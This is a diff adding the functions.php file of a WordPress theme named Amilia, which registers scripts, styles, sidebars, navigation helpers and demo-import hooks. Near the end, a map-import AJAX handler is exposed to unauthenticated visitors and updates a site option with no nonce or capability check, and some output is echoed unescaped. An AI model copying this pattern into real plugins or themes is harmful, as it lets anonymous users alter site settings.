+    require( get_template_directory() . '/inc/megamenu/mega-menu.php' );
+}
+
+/* Add widgets */
+require( get_template_directory() . '/inc/widgets/cart_search.php' );
+require( get_template_directory() . '/inc/widgets/news_tabs.php' );
+require( get_template_directory() . '/inc/widgets/cms-recentposts.php' );
+require( get_template_directory() . '/inc/widgets/cms-social.php' );
+require( get_template_directory() . '/inc/widgets/flickrphotos.php' );
+require( get_template_directory() . '/inc/widgets/tweets.php' );
+require( get_template_directory() . '/inc/widgets/latest-tweets.php' );
+// Set up the content width value based on the theme's design and stylesheet.
+if ( ! isset( $content_width ) )
+	$content_width = 625;
+
+/**
+ * CMS Theme setup.
+ *
+ * Sets up theme defaults and registers the various WordPress features that
+ * CMS Theme supports.
+ *
+ * @uses load_theme_textdomain() For translation/localization support.
+ * @uses add_editor_style() To add a Visual Editor stylesheet.
+ * @uses add_theme_support() To add support for post thumbnails, automatic feed links,
+ * 	custom background, and post formats.
+ * @uses register_nav_menu() To add support for navigation menus.
+ * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
+ *
+ * @since 1.0.0
+ */
+function amilia_setup() {
+	/*
+	 * Makes Twenty Twelve available for translation.
+	 *
+	 * Translations can be added to the /languages/ directory.
+	 * If you're building a theme based on Twenty Twelve, use a find and replace
+	 * to change 'wp-amilia' to the name of your theme in all the template files.
+	 */
+	load_theme_textdomain( 'wp-amilia' , get_template_directory() . '/languages' );
+
+	// Adds title tag
+	add_theme_support( "title-tag" );
+
+	// Add woocommerce
+	add_theme_support('woocommerce');
+
+	// Adds custom header
+	add_theme_support( 'custom-header' );
+
+	// Adds RSS feed links to <head> for posts and comments.
+	add_theme_support( 'automatic-feed-links' );
+
+	// This theme supports a variety of post formats.
+	add_theme_support( 'post-formats', array( 'video', 'audio' , 'gallery', 'quote', 'link') );
+
+	// This theme uses wp_nav_menu() in one location.
+	register_nav_menu( 'primary', esc_html__( 'Primary Menu', 'wp-amilia' ) );
+	register_nav_menu( 'footer-menu', esc_html__( 'Footer Menu', 'wp-amilia' ) );
+
+	/*
+	 * This theme supports custom background color and image,
+	 * and here we also set up the default background color.
+	 */
+	add_theme_support( 'custom-background', array(
+		'default-color' => 'e6e6e6',
+	) );
+
+	// This theme uses a custom image size for featured images, displayed on "standard" posts.
+	add_theme_support( 'post-thumbnails' );
+	add_image_size('amilia-thumbnail-masonry', 500);
+	add_image_size('amilia-blog-large', 870, 430, true);
+	add_image_size('amilia-blog-full', 1200, 440, true);
+	add_image_size('amilia-portfolio-wide', 570, 420, true);
+	add_image_size('amilia-portfolio-square', 500, 500, true);
+	add_image_size('amilia-team', 600, 350, true);
+	set_post_thumbnail_size( 624, 9999 ); // Unlimited height, soft crop
+
+	/*
+	 * This theme styles the visual editor to resemble the theme style,
+	 * specifically font, colors, icons, and column width.
+	 */
+	add_editor_style( array( 'assets/css/editor-style.css' ) );
+
+}
+
+add_action( 'after_setup_theme', 'amilia_setup' );
+
+/**
+ * Get meta data.
+ * @author Fox
+ * @return mixed|NULL
+ */
+function amilia_meta_data(){
+    global $post, $amilia_meta;
+
+    if(!isset($post->ID)) return ;
+
+    $amilia_meta = json_decode(get_post_meta($post->ID, '_cms_meta_data', true));
+
+    if(empty($amilia_meta)) return ;
+
+    foreach ($amilia_meta as $key => $meta){
+        $amilia_meta->$key = rawurldecode($meta);
+    }
+}
+add_action('wp', 'amilia_meta_data');
+
+/**
+ * Get post meta data.
+ * @author Fox
+ * @return mixed|NULL
+ */
+function amilia_post_meta_data(){
+    global $post;
+
+    if(!isset($post->ID)) return null;
+
+    $post_meta = json_decode(get_post_meta($post->ID, '_cms_meta_data', true));
+
+    if(empty($post_meta)) return null;
+
+    foreach ($post_meta as $key => $meta){
+        $post_meta->$key = rawurldecode($meta);
+    }
+
+    return $post_meta;
+}
+
+/**
+ * Enqueue scripts and styles for front-end.
+ * @author Fox
+ * @since CMS SuperHeroes 1.0
+ */
+function amilia_scripts_styles() {
+
+	global $smof_data, $wp_styles, $amilia_meta;
+
+	/** theme options. */
+	$script_options = array(
+	    'menu_sticky'=> $smof_data['menu_sticky'],
+	    'paralax' => 1,
+	    'back_to_top'=> $smof_data['footer_botton_back_to_top']
+	);
+
+	/*------------------------------------- JavaScript ---------------------------------------*/
+
+
+	/** --------------------------libs--------------------------------- */
+
+
+	/* Adds JavaScript Bootstrap. */
+	wp_enqueue_script('bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array( 'jquery' ), '3.3.2');
+
+	/* Add parallax plugin. */
+	wp_enqueue_script('amilia-enque-wow', get_template_directory_uri() . '/assets/js/wow.min.js', array( 'jquery' ), '1.1.2', true);
+	wp_enqueue_script('amilia-enque-parallax', get_template_directory_uri() . '/assets/js/jquery.parallax-1.1.3.js', array( 'jquery' ), '1.1.3', true);
+	wp_enqueue_script('amilia-enque-magnific', get_template_directory_uri() . '/assets/js/jquery.magnific-popup.min.js', array( 'jquery' ), '1.1.3', true);
+	wp_enqueue_script('amilia-enqueue-equalheights', get_template_directory_uri() . '/assets/js/jquery.equalheights.js', array( 'jquery' ), '1.5.1', true);
+	if ( !wp_script_is('', 'owl-carousel')) {
+		wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/assets/js/owl.carousel.min.js', array(), '2.0.0', true);
+	}
+	/* Add One Page plugin. */
+	if(is_page() && isset($amilia_meta->_cms_one_page) && $amilia_meta->_cms_one_page) {
+	    wp_enqueue_script('jquery.singlePageNav', get_template_directory_uri() . '/assets/js/jquery.singlePageNav.js', array( 'jquery' ), '1.0.0', true);
+
+	    if(!empty($amilia_meta->_cms_one_page_easing)){
+	        wp_enqueue_script('jquery-effects-core');
+	        $script_options['one_page_easing'] = !empty($amilia_meta->_cms_one_page_easing) ? $amilia_meta->_cms_one_page_easing : 'swing';
+	    }
+
+	    $script_options['one_page'] = true;
+	    $script_options['one_page_speed'] = !empty($amilia_meta->_cms_one_page_speed) ? $amilia_meta->_cms_one_page_speed : 1000;
+	}
+	wp_enqueue_script('fitvids', get_template_directory_uri() . '/assets/js/jquery.fitvids.js', array( 'jquery' ), '1.1', true);
+	wp_enqueue_script('in-view', get_template_directory_uri() . '/assets/js/jquery.inview.js', array( 'jquery' ), '1.0.0', true);
+	wp_enqueue_script( 'waypoints' );
+	wp_enqueue_script('progressCircle', get_template_directory_uri() . '/assets/js/process_cycle.js', array( 'jquery' ), '1.0.0', true);
+    wp_enqueue_script('vc_pie_custom', get_template_directory_uri() . '/assets/js/vc_pie_custom.js', array( 'jquery' ), '1.0.0', true);
+
+	/* Add smoothscroll plugin */
+	if($smof_data['smoothscroll']){
+	   wp_enqueue_script('amilia-enque-smoothscroll', get_template_directory_uri() . '/assets/js/smoothscroll.min.js', array( 'jquery' ), '1.0.0', true);
+	}
+	wp_enqueue_script('amilia-enque-sticky', get_template_directory_uri() . '/assets/js/jquery.sticky.js', array( 'jquery' ), '1.0.0', true);
+
+	/** --------------------------custom------------------------------- */
+	/* Add menu.js */
+    wp_enqueue_script('amilia-enque-menu', get_template_directory_uri() . '/assets/js/menu.js', array( 'jquery' ), '1.0.0', true);
+	/* Add main.js */
+	wp_register_script('amilia-enque-main', get_template_directory_uri() . '/assets/js/main.js', array( 'jquery' ), '1.0.0', true);
+	wp_localize_script('amilia-enque-main', 'CMSOptions', $script_options);
+	wp_enqueue_script('amilia-enque-main');
+
+	/*
+	 * Adds JavaScript to pages with the comment form to support
+	 * sites with threaded comments (when in use).
+	 */
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
+		wp_enqueue_script( 'comment-reply' );
+
+    /*------------------------------------- Stylesheet ---------------------------------------*/
+
+	/** --------------------------libs--------------------------------- */
+
+	/* Loads Bootstrap stylesheet. */
+	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.min.css', array(), '3.3.2');
+
+	/* Loads Bootstrap stylesheet. */
+	wp_enqueue_style('amilia-enque-font-awesome', get_template_directory_uri() . '/assets/css/font-awesome.min.css', array(), '4.3.0');
+
+	/* Loads ElegantIcons. */
+	wp_enqueue_style('amilia-enque-elegantIcons', get_template_directory_uri() . '/assets/css/icons-fonts.css', array(), '1.0.1');
+	wp_enqueue_style('amilia-enque-animate', get_template_directory_uri() . '/assets/css/animate.min.css', array(), '1.0.1');
+
+	/** --------------------------custom------------------------------- */
+
+	/* Loads our main stylesheet. */
+	wp_enqueue_style( 'amilia-enque-style', get_stylesheet_uri(), array( 'amilia-enque-bootstrap' ));
+
+	/* Loads the Internet Explorer specific stylesheet. */
+	wp_enqueue_style( 'amilia-enque-ie', get_template_directory_uri() . '/assets/css/ie.css', array( 'amilia-enque-style' ), '20121010' );
+	$wp_styles->add_data( 'amilia-enque-ie', 'conditional', 'lt IE 9' );
+
+	/* WooCommerce */
+	if(class_exists('WooCommerce')){
+	    wp_enqueue_style( 'woocommerce', get_template_directory_uri() . "/assets/css/woocommerce.css", array(), '1.0.0');
+	}
+
+	/* Load static css*/
+    $static_css = (isset($smof_data['presets_color']) && $smof_data['presets_color'] > 0) ? "presets-".$smof_data['presets_color'].".css" : "static.css" ;
+    wp_enqueue_style('amilia-enque-static', get_template_directory_uri() . '/assets/css/'.$static_css, array(), '1.0.0','all');
+}
+
+add_action( 'wp_enqueue_scripts', 'amilia_scripts_styles' );
+
+/**
+ * Include icon-font to CMS shortcode
+ */
+function amilia_admin_scripts() {
+	global $pagenow;
+	if($pagenow == 'post.php' || $pagenow == 'post-new.php'){
+		wp_enqueue_style('amilia-enque-admin-elegantIcons', get_template_directory_uri() . '/assets/css/icons-fonts.css', array(), '1.0.1');
+	}
+
+	wp_enqueue_style('amilia-admin-css', get_template_directory_uri() . '/assets/css/cms_admin_css.css', array(), '1.0.0');	
+}
+add_action('admin_enqueue_scripts', 'amilia_admin_scripts');
+
+/**
+ * Register sidebars.
+ *
+ * Registers our main widget area and the front page widget areas.
+ *
+ * @since Fox
+ */
+function amilia_widgets_init() {
+	register_sidebar( array(
+		'name' => esc_html__( 'Main Sidebar', 'wp-amilia' ),
+		'id' => 'sidebar-1',
+		'description' => esc_html__( 'Appears on posts and pages except the optional Front Page template, which has its own widgets', 'wp-amilia' ),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget' => '</aside>',
+		'before_title' => '<h3 class="wg-title">',
+		'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+		'name' => esc_html__( 'Top Cart Search', 'wp-amilia' ),
+		'id' => 'cart-search-top',
+		'description' => esc_html__( '', 'wp-amilia' ),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget' => '</aside>',
+		'before_title' => '<h3 class="wg-title">',
+		'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+		'name' => esc_html__( 'Shortcodes Sidebar', 'wp-amilia' ),
+		'id' => 'shortcodes-sidebar',
+		'description' => esc_html__( '', 'wp-amilia' ),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget' => '</aside>',
+		'before_title' => '<h4>',
+		'after_title' => '</h4>',
+	) );
+
+	register_sidebar( array(
+		'name' => esc_html__( 'Typography Sidebar', 'wp-amilia' ),
+		'id' => 'typography-sidebar',
+		'description' => esc_html__( '', 'wp-amilia' ),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget' => '</aside>',
+		'before_title' => '<h4>',
+		'after_title' => '</h4>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Bottom Area: Newsletter', 'wp-amilia' ),
+    	'id' => 'bottom-area',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Bottom Area', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Bottom Area: Map', 'wp-amilia' ),
+    	'id' => 'bottom-area-map',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Bottom Area', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Portfolio Single Area', 'wp-amilia' ),
+    	'id' => 'port-single-area',
+    	'description' => esc_html__( 'Appears to Portfoli single area', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 1: Column 1', 'wp-amilia' ),
+    	'id' => 'footer-11',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 1', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 1: Column 2', 'wp-amilia' ),
+    	'id' => 'footer-12',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 2', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 1: Column 3', 'wp-amilia' ),
+    	'id' => 'footer-13',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 3', 'wp-amilia' ),
+    	'before_widget' => '<aside class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 2: Column 1', 'wp-amilia' ),
+    	'id' => 'footer-21',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 1', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 2: Column 2', 'wp-amilia' ),
+    	'id' => 'footer-22',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 2', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 2: Column 3', 'wp-amilia' ),
+    	'id' => 'footer-23',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 3', 'wp-amilia' ),
+    	'before_widget' => '<aside class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 3: Column 1', 'wp-amilia' ),
+    	'id' => 'footer-31',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 1', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 3: Column 2', 'wp-amilia' ),
+    	'id' => 'footer-32',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 2', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 3: Column 3', 'wp-amilia' ),
+    	'id' => 'footer-33',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 3', 'wp-amilia' ),
+    	'before_widget' => '<aside class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 4: Column 1', 'wp-amilia' ),
+    	'id' => 'footer-41',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 1', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 4: Column 2', 'wp-amilia' ),
+    	'id' => 'footer-42',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 2', 'wp-amilia' ),
+    	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Footer 4: Column 3', 'wp-amilia' ),
+    	'id' => 'footer-43',
+    	'description' => esc_html__( 'Appears when using the optional Footer with a page set as Footer 3', 'wp-amilia' ),
+    	'before_widget' => '<aside class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	register_sidebar( array(
+    	'name' => esc_html__( 'Menu Widget Area', 'wp-amilia' ),
+    	'id' => 'menu-widget-area',
+    	'description' => esc_html__( 'Suitable with text widget', 'wp-amilia' ),
+    	'before_widget' => '<aside class="widget %2$s">',
+    	'after_widget' => '</aside>',
+    	'before_title' => '<h3 class="wg-title">',
+    	'after_title' => '</h3>',
+	) );
+
+	if(class_exists('WooCommerce')) {
+		register_sidebar( array(
+			'name' => esc_html__( 'Woocommerce Sidebar', 'wp-amilia' ),
+			'id' => 'woocommerce_sidebar',
+			'description' => esc_html__( '', 'wp-amilia' ),
+			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+			'after_widget' => '</aside>',
+			'before_title' => '<h3 class="wg-title">',
+			'after_title' => '</h3>',
+		) );
+	}
+}
+add_action( 'widgets_init', 'amilia_widgets_init' );
+
+/**
+ * Filter the page menu arguments.
+ *
+ * Makes our wp_nav_menu() fallback -- wp_page_menu() -- show a home link.
+ *
+ * @since 1.0.0
+ */
+function amilia_page_menu_args( $args ) {
+    if ( ! isset( $args['show_home'] ) )
+        $args['show_home'] = true;
+    return $args;
+}
+add_filter( 'wp_page_menu_args', 'amilia_page_menu_args' );
+
+/**
+ * Display navigation to next/previous comments when applicable.
+ *
+ * @since 1.0.0
+ */
+function amilia_comment_nav() {
+    // Are there comments to navigate through?
+    if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) :
+    ?>
+	<nav class="navigation comment-navigation" role="navigation">
+		<h2 class="screen-reader-text"><?php esc_html_e( 'Comment navigation', 'wp-amilia' ); ?></h2>
+		<div class="nav-links">
+			<?php
+				if ( $prev_link = get_previous_comments_link( esc_html__( 'Older Comments', 'wp-amilia' ) ) ) :
+					printf( '<div class="nav-previous">%s</div>', $prev_link );
+				endif;
+
+				if ( $next_link = get_next_comments_link( esc_html__( 'Newer Comments', 'wp-amilia' ) ) ) :
+					printf( '<div class="nav-next">%s</div>', $next_link );
+				endif;
+			?>
+		</div><!-- .nav-links -->
+	</nav><!-- .comment-navigation -->
+	<?php
+	endif;
+}
+
+/**
+ * Display navigation to next/previous set of posts when applicable.
+ *
+ * @since 1.0.0
+ */
+function amilia_paging_nav() {
+    // Don't print empty markup if there's only one page.
+	if ( $GLOBALS['wp_query']->max_num_pages < 2 ) {
+		return;
+	}
+
+	$paged        = get_query_var( 'paged' ) ? intval( get_query_var( 'paged' ) ) : 1;
+	$pagenum_link = html_entity_decode( get_pagenum_link() );
+	$query_args   = array();
+	$url_parts    = explode( '?', $pagenum_link );
+
+	if ( isset( $url_parts[1] ) ) {
+		wp_parse_str( $url_parts[1], $query_args );
+	}
+
+	$pagenum_link = remove_query_arg( array_keys( $query_args ), $pagenum_link );
+	$pagenum_link = trailingslashit( $pagenum_link ) . '%_%';
+
+	$format  = $GLOBALS['wp_rewrite']->using_index_permalinks() && ! strpos( $pagenum_link, 'index.php' ) ? 'index.php/' : '';
+	$format .= $GLOBALS['wp_rewrite']->using_permalinks() ? user_trailingslashit( 'page/%#%', 'paged' ) : '?paged=%#%';
+
+	// Set up paginated links.
+	$links = paginate_links( array(
+			'base'     => $pagenum_link,
+			'format'   => $format,
+			'total'    => $GLOBALS['wp_query']->max_num_pages,
+			'current'  => $paged,
+			'mid_size' => 1,
+			'add_args' => array_map( 'urlencode', $query_args ),
+			'prev_text' => '<i class="fa fa-angle-left"></i>',
+			'next_text' => '<i class="fa fa-angle-right"></i>',
+	) );
+
+	if ( $links ) :
+
+	?>
+	<nav class="navigation paging-navigation clearfix" role="navigation">
+			<div class="pagination loop-pagination">
+				<?php echo ''.$links; ?>
+			</div><!-- .pagination -->
+	</nav><!-- .navigation -->
+	<?php
+	endif;
+}
+
+/**
+* Display navigation to next/previous post when applicable.
+*
+* @since 1.0.0
+*/
+function amilia_post_nav() {
+    global $post;
+
+    // Don't print empty markup if there's nowhere to navigate.
+    $previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );
+    $next     = get_adjacent_post( false, '', false );
+
+    if ( ! $next && ! $previous )
+        return;
+    ?>
+	<nav class="navigation post-navigation" role="navigation">
+		<div class="nav-links clearfix">
+			<?php
+			$prev_post = get_previous_post();
+			if (!empty( $prev_post )): ?>
+			  <a class="btn btn-default post-prev left" href="<?php echo get_permalink( $prev_post->ID ); ?>"><i class="fa fa-angle-left"></i><?php echo esc_attr($prev_post->post_title); ?></a>
+			<?php endif; ?>
+			<?php
+			$next_post = get_next_post();
+			if ( is_a( $next_post , 'WP_Post' ) ) { ?>
+			  <a class="btn btn-default post-next right" href="<?php echo get_permalink( $next_post->ID ); ?>"><?php echo get_the_title( $next_post->ID ); ?><i class="fa fa-angle-right"></i></a>
+			<?php } ?>
+
+			</div><!-- .nav-links -->
+	</nav><!-- .navigation -->
+	<?php
+}
+
+/* Add Custom Comment */
+function amilia_comment($comment, $args, $depth) {
+	$GLOBALS['comment'] = $comment;
+	global $post;
+	extract($args, EXTR_SKIP);
+
+	if ( 'div' == $args['style'] ) {
+		$tag = 'div';
+		$add_below = 'comment';
+	} else {
+		$tag = 'li';
+		$add_below = 'div-comment';
+	}
+    ?>
+    <<?php echo esc_attr($tag) ?> <?php comment_class( empty( $args['has_children'] ) ? '' : 'parent' ) ?> id="comment-<?php comment_ID() ?>">
+    <?php if ( 'div' != $args['style'] ) : ?>
+    <div id="div-comment-<?php comment_ID() ?>" class="comment-body clearfix">
+    <?php endif; ?>
+
+	    <div class="comment-author-image vcard ">
+	    	<?php echo get_avatar( $comment, 86 ); ?>
+	    </div>
+	    <?php if ( $comment->comment_approved == '0' ) : ?>
+	    	<em class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.' , 'wp-amilia'); ?></em>
+	    <?php endif; ?>
+	    <div class="comment-main">
+	    	<div class="comment-author-wrap commentmetadata">
+	    		<span class="comment-author"><?php //the_author_posts_link(); ?><?php echo get_comment_author_link(); ?></span>
+	    		<span class="comment-date">
+	    		<?php
+	    			echo get_the_date('F j, Y \a\t g:ia');
+	    		?>
+	    		</span>
+	    	</div>
+	    	<div class="comment-content">
+	    		<?php comment_text(); ?>
+	    		<div class="reply">
+	    			<?php comment_reply_link( array_merge( $args, array('reply_text' => '<i class="arrow_back"></i>', 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
+	    		</div>
+	    	</div>
+	    </div>
+    <?php if ( 'div' != $args['style'] ) : ?>
+    </div>
+    <?php endif; ?>
+    <?php
+}
+
+/**
+ * limit words
+ *
+ * @since 1.0.0
+ */
+if (!function_exists('amilia_limit_words')) {
+    function amilia_limit_words($string, $word_limit) {
+        $words = explode(' ', $string, ($word_limit + 1));
+        if (count($words) > $word_limit) {
+            array_pop($words);
+        }
+        return implode(' ', $words)."";
+    }
+}
+
+/**
+ * Set home page.
+ *
+ * get home title and update options.
+ *
+ * @return Home page title.
+ * @author FOX
+ */
+function amilia_set_home_page(){
+
+    $home_page = 'Home'; /* Page name, which you want set is home page default */
+
+    $page = get_page_by_title($home_page);
+
+    if(!isset($page->ID))
+        return ;
+
+    update_option('show_on_front', 'page');
+    update_option('page_on_front', $page->ID);
+}
+
+add_action('cms_import_finish', 'amilia_set_home_page');
+
+/**
+ * Set menu locations.
+ *
+ * get locations and menu name and update options.
+ *
+ * @return string[]
+ * @author FOX
+ */
+function amilia_set_menu_location(){
+
+    $setting = array(
+        'Menu Footer' => 'footer-menu',
+        'Main menu' => 'primary'
+    );
+
+    $navs = wp_get_nav_menus();
+
+    $new_setting = array();
+
+    foreach ($navs as $nav){
+
+        if(!isset($setting[$nav->name]))
+            continue;
+
+        $id = $nav->term_id;
+        $location = $setting[$nav->name];
+
+        $new_setting[$location] = $id;
+    }
+
+    set_theme_mod('nav_menu_locations', $new_setting);
+}
+
+add_action('cms_import_finish', 'amilia_set_menu_location');
+
+/* Import map */
+function amilia_add_map_js(){
+    wp_enqueue_script('max-import-map', get_template_directory_uri() . '/assets/js/import-map.js', array( 'jquery' ), '1.0.0', true);
+}
+add_action( 'admin_enqueue_scripts', 'amilia_add_map_js' );
+/* AJAX HANDLER */
+add_action('wp_ajax_max_import_map', 'amilia_import_map_callback');
+add_action('wp_ajax_nopriv_max_import_map', 'amilia_import_map_callback');
+
+function amilia_import_map_callback(){
+    $request = wp_remote_get(get_template_directory_uri() . '/inc/dummy/amilia/maps_backup.json');
+    $file = wp_remote_retrieve_body( $request );
+
+	$options = get_option('mymaps_options');
+	if( $file_content =  json_decode($file, true ) ) {
+
+		/* Decode and redefine */
+		try {
+			$_HOST_             = $file_content['_host_'];
+			$_MY_STYLES_        = (isset($file_content['_mystyles_']) && $file_content['_mystyles_'] != '' ) ? json_decode(rawurldecode($file_content['_mystyles_']), true) : '';
+			$_MAP_POST_         = (isset($file_content['_map_posts_']) && $file_content['_map_posts_'] != '' ) ? json_decode(rawurldecode($file_content['_map_posts_']), true) : '';
+			$_ICONS_            = (isset($file_content['_icons_']) && $file_content['_icons_'] != '' ) ? json_decode(rawurldecode($file_content['_icons_']), true) : '';
+		} catch(Exception $e ) {
+			echo 'content_incorrect'; exit();
+		}
+
+		/* check style */
+		if( is_array($_MY_STYLES_) && count($_MY_STYLES_) > 0 )
+		{
+			foreach( $_MY_STYLES_  as $name => $value ) {
+				if( !array_key_exists( $name, $options['_mystyles_'] ) )
+				{
+					$options['_mystyles_'][$name] = $value;
+				}
+			}
+		}
+
+		/* check icon */
+		if( is_array($_ICONS_) && count($_ICONS_) > 0 )
+		{
+			foreach( $_ICONS_ as $value ) {
+				if( !in_array( $value, $options['_icons_'] ) )
+				{
+					$options['_icons_'][] = $value;
+				}
+			}
+		}
+		/* check post */
+		$options['_map_posts_'] = array();
+
+		$cur_content_dir = (function_exists('content_url')) ? content_url() : plugins_url('.../.../',__FILE__);
+		if( is_array($_MAP_POST_) && count($_MAP_POST_) > 0 )
+		{
+			foreach( $_MAP_POST_ as $value ) {
+				try{
+					$value['markers'] = str_replace($_HOST_, $cur_content_dir, $value['markers']);
+				} catch( Exception $e ){
+					echo 'fail';
+					exit();
+				}
+				$options['_map_posts_'][] = $value;
+			}
+		}
+		/* update */
+		if( update_option( 'mymaps_options', $options ) ) {
+			echo 'success';
+		} else {
+			echo 'nothing_change';
+		}
+	} else {
+		echo 'content_incorrect';
+	}
+}
